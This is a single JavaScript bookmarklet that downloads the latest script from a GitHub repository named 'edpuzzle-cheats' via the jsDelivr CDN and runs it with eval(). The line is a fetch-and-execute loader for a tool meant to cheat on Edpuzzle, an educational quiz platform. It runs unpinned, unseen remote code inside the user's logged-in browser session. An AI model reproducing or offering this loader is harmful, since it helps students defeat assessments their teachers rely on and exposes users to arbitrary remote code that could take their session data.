javascript: fetch(
  "https://cdn.jsdelivr.net/gh/atomisadev/edpuzzle-cheats@latest/script.js"
)
  .then((r) => r.text())
  .then((r) => eval(r));
